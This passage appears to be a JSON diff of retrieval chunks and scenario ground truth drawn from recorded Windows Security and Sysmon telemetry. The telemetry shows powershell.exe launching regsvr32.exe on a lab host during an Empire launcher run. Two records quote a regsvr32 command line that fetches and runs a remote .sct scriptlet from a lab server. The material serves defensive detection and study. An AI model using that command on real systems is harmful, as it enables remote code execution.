+              "Hostname": "WORKSTATION5.mordor.local",
+              "SourceName": "Microsoft-Windows-Security-Auditing"
+            },
+            "raw_record_ref": "jsonl:line:283",
+            "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+          }
+        ]
+      },
+      "evidence_layer": "observed_telemetry"
+    },
+    {
+      "origin": {
+        "kind": "chunk",
+        "item_id": "retrieval-chunk--a62bce534cb5dd176af7568eb96793f63ac9b5c388720aff8a5024915c19f408",
+        "context_pointer": "/retrieval/hits/3/chunk"
+      },
+      "source": {
+        "artifact_type": "scenario_ground_truth",
+        "json_pointer": "/evidence/0",
+        "object_id": "creation-process-1356a3e1f91322ca",
+        "object_type": "evidence"
+      },
+      "status": "observed",
+      "object_type": "evidence",
+      "source_bound": true,
+      "source_references": [
+        {
+          "raw_record_ref": "jsonl:line:219",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:97",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        }
+      ],
+      "text": "Evidence creation-process-1356a3e1f91322ca. Type: process_creation. Summary: powershell.exe created regsvr32.exe; Security/Sysmon observations describe one creation. Status: observed. Observations: provider=Microsoft-Windows-Security-Auditing, event_id=4688, timestamp=2020-07-22T03:27:53.590000Z; provider=Microsoft-Windows-Sysmon, event_id=1, timestamp=2020-07-22T03:27:53.548000Z.",
+      "properties": {
+        "evidence_layer": "observed_telemetry",
+        "source_object": {
+          "evidence_id": "creation-process-1356a3e1f91322ca",
+          "evidence_type": "process_creation",
+          "observations": [
+            {
+              "event_id": "1",
+              "provider": "Microsoft-Windows-Sysmon",
+              "raw_record_ref": "jsonl:line:97",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
+              "timestamp": "2020-07-22T03:27:53.548000Z"
+            },
+            {
+              "event_id": "4688",
+              "provider": "Microsoft-Windows-Security-Auditing",
+              "raw_record_ref": "jsonl:line:219",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
+              "timestamp": "2020-07-22T03:27:53.590000Z"
+            }
+          ],
+          "source_references": [
+            {
+              "raw_record_ref": "jsonl:line:97",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+            },
+            {
+              "raw_record_ref": "jsonl:line:219",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+            }
+          ],
+          "status": "observed",
+          "summary": "powershell.exe created regsvr32.exe; Security/Sysmon observations describe one creation."
+        },
+        "source_observations": [
+          {
+            "canonical_fields": {
+              "channel": "Security",
+              "command_line": "\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll",
+              "event_id": "4688",
+              "host": "WORKSTATION5.mordor.local",
+              "parent_process_id": "0x21c8",
+              "parent_process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "process_id": "0x24a8",
+              "process_name": "C:\\Windows\\System32\\regsvr32.exe",
+              "provider": "Microsoft-Windows-Security-Auditing",
+              "raw_record_ref": "jsonl:line:219",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
+              "subject_user": "pgustavo",
+              "timestamp": "2020-07-22T03:27:53.590000Z"
+            },
+            "evidence_layer": "observed_telemetry",
+            "field_projection": "canonical non-null scalars plus unmapped authentication/source clock fields; originals remain upstream",
+            "original_fields": {
+              "@timestamp": "2020-07-22T03:27:53.590Z",
+              "EventID": 4688,
+              "Hostname": "WORKSTATION5.mordor.local",
+              "SourceName": "Microsoft-Windows-Security-Auditing"
+            },
+            "raw_record_ref": "jsonl:line:219",
+            "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+          },
+          {
+            "canonical_fields": {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "command_line": "\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll",
+              "event_id": "1",
+              "host": "WORKSTATION5.mordor.local",
+              "parent_command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+              "parent_process_guid": "{b59756a9-89dc-5f17-1006-000000000400}",
+              "parent_process_id": "8648",
+              "parent_process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "process_guid": "{b59756a9-b238-5f17-5207-000000000400}",
+              "process_id": "9384",
+              "process_name": "C:\\Windows\\System32\\regsvr32.exe",
+              "provider": "Microsoft-Windows-Sysmon",
+              "raw_record_ref": "jsonl:line:97",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
+              "timestamp": "2020-07-22T03:27:53.548000Z",
+              "user": "MORDOR\\pgustavo"
+            },
+            "evidence_layer": "observed_telemetry",
+            "field_projection": "canonical non-null scalars plus unmapped authentication/source clock fields; originals remain upstream",
+            "original_fields": {
+              "@timestamp": "2020-07-22T03:27:53.548Z",
+              "EventID": 1,
+              "Hostname": "WORKSTATION5.mordor.local",
+              "OriginalFileName": "REGSVR32.EXE",
+              "SourceName": "Microsoft-Windows-Sysmon",
+              "UtcTime": "2020-07-22 03:27:52.809"
+            },
+            "raw_record_ref": "jsonl:line:97",
+            "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+          }
+        ]
+      },
+      "evidence_layer": "observed_telemetry"
+    },
+    {
+      "origin": {
+        "kind": "chunk",
+        "item_id": "retrieval-chunk--cda169e8bc034d29e1e6a71cf9c805314983de89541b704d24f882786745b0bf",
+        "context_pointer": "/retrieval/hits/4/chunk"
+      },
+      "source": {
+        "artifact_type": "scenario_ground_truth",
+        "json_pointer": "/entities/0",
+        "object_id": "process-1356a3e1f91322ca",
+        "object_type": "entity"
+      },
+      "status": "observed",
+      "object_type": "entity",
+      "source_bound": true,
+      "source_references": [
+        {
+          "raw_record_ref": "jsonl:line:219",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:97",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        }
+      ],
+      "text": "Entity regsvr32.exe. Type: process. Status: observed. Attributes: {\"host\":\"WORKSTATION5.mordor.local\",\"process_guid\":\"{b59756a9-b238-5f17-5207-000000000400}\",\"process_id\":\"9384\",\"process_name\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"}.",
+      "properties": {
+        "evidence_layer": "observed_telemetry",
+        "source_object": {
+          "attributes": {
+            "host": "WORKSTATION5.mordor.local",
+            "process_guid": "{b59756a9-b238-5f17-5207-000000000400}",
+            "process_id": "9384",
+            "process_name": "C:\\Windows\\System32\\regsvr32.exe"
+          },
+          "entity_id": "process-1356a3e1f91322ca",
+          "entity_type": "process",
+          "evidence_ids": [
+            "creation-process-1356a3e1f91322ca"
+          ],
+          "name": "regsvr32.exe",
+          "status": "observed"
+        }
+      },
+      "evidence_layer": "observed_telemetry"
+    }
+  ],
+  "source_observation_resolution": "source-observation-interning/v1: field pointers address the losslessly expanded supplied context; raw refs retain their original source identity"
+}
